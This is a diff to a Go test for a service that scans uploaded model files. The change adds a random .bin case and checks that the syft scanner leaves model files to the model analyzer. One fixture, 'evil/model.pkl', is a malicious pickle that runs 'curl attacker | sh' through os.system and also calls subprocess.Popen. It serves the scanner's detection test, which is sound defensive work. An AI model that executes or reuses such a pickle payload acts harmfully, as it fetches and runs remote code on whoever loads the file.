@@ -3,7 +3,9 @@
 package scan_test
 
 import (
+	"errors"
 	"log/slog"
+	"os"
 	"strings"
 	"testing"
 
@@ -33,6 +35,7 @@ func TestModelScanning(t *testing.T) {
 	for path, body := range map[string]string{
 		"evil/model.pkl":        "cos\nsystem\n(S'curl attacker | sh'\ntR0csubprocess\nPopen\n(S'id'\ntR.",
 		"clean/model.pkl":       "\x80\x02ccollections\nOrderedDict\nq\x00)Rq\x01.",
+		"blobs/random.bin":      "\x13\x37 random bytes, not a model",
 		"clean/notes-model.txt": "not scanned",
 	} {
 		if _, err := repos.Deploy(ctx, repository.DeployInput{
@@ -45,13 +48,13 @@ func TestModelScanning(t *testing.T) {
 		}
 	}
 
-	syft, grype, _ := fakeScanners(t)
+	syft, grype, cataloged := fakeScanners(t)
 	svc := scan.NewService(db, blobs, syft, grype, scan.Limits{}, log)
 	svc.SetAnalyzers(scan.Model{})
 
 	claimed, err := svc.Claim(ctx, 10)
-	if err != nil || len(claimed) != 2 {
-		t.Fatalf("claim = %v %v, want the two pickles", claimed, err)
+	if err != nil || len(claimed) != 3 {
+		t.Fatalf("claim = %v %v, want the two pickles and the .bin file", claimed, err)
 	}
 
 	critical := map[string]bool{}
@@ -60,6 +63,10 @@ func TestModelScanning(t *testing.T) {
 	for _, c := range claimed {
 		if err := svc.ScanArtifact(ctx, c.Sha256, c.FileName); err != nil {
 			t.Fatal(err)
+		}
+
+		if a, err := db.GetScanArtifact(ctx, c.Sha256); err != nil || a.Status != scan.StatusDone {
+			t.Errorf("scan of %s = %s (%s), %v; want done", c.FileName, a.Status, a.Reason, err)
 		}
 
 		issues, err := scan.NewResults(db).Issues(ctx, c.Sha256)
@@ -76,6 +83,10 @@ func TestModelScanning(t *testing.T) {
 				unsafe[i.Resource] = true
 			}
 		}
+	}
+
+	if sources, err := os.ReadFile(cataloged); !errors.Is(err, os.ErrNotExist) {
+		t.Errorf("syft cataloged %q, %v; want model files left to the model analyzer alone", sources, err)
 	}
 
 	if len(critical) != 1 {
